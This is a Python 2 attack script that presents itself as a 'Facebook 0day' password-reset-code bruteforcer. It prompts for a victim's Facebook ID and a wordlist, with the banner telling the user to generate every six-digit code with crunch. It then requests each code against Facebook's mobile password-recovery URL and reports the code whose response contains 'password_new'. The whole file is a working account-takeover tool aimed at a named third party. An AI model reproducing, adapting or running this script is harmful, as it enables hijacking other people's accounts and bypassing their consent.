#!/usr/bin/env python

try:
	import urllib2, ssl, sys, time, re, os
except ImportError:
	exit("[#] Please install Newer Version of Python!")

if "linux" in sys.platform:
	os.system('clear')
else:
	os.system('cls')

def banner():
	print """
 _    _ _     _ _       _   _       _     _____              __ 
| |  | | |   (_) |     | | | |     | |   /  __ \            / _|
| |  | | |__  _| |_ ___| |_| | __ _| |_  | /  \/ ___  _ __ | |_ 
| |/\| | '_ \| | __/ _ \  _  |/ _` | __| | |    / _ \| '_ \|  _|
\  /\  / | | | | ||  __/ | | | (_| | |_  | \__/\ (_) | | | | |  
 \/  \/|_| |_|_|\__\___\_| |_/\__,_|\__|  \____/\___/|_| |_|_|  
                                                                
----------------------------------------------------------------
'Facebook 0day' Password reset Code bruteforcer

Author: Muhammad Adeel
Mail: Chaudhary1337@gmail.com
Blog: http://urdusecurity.blogspot.com

[#] To Get Password list of all possible reset codes, Do it.

root@bt~$ crunch 6 6 1234567890 -o passlist.txt 
----------------------------------------------------------------\n
"""

banner()
victim_profile = raw_input("[#] Victim Facebook ID: ")
password_list = raw_input("[#] Password List: ")

def ZerOday():
	print "\n[!] Please sit down and have some snacks Untill exploit gets his job done!\n"
	try:
		passwd = open(password_list, 'r').readlines()
	except IOError:
		exit("[#] Unable to Find Password list.")
	for passw in passwd:
		passw = passw.rstrip()
		try:
			base_url = 'https://m.facebook.com/recover/password?u='+victim_profile+'&n='+passw
			req = urllib2.urlopen(base_url).read()
		except:
			exit("[#] Unable to Send Request.")
		regex = re.search('password_new', req)
		if regex:
			print "\n\n[#] The Reset code is Found => {0}".format(passw)
			exit()
		else:
			sys.stdout.write("Trying: " + passw + '\n')
			sys.stdout.flush()

ZerOday()

def main():
	if __name__ == '__main__':
		main()
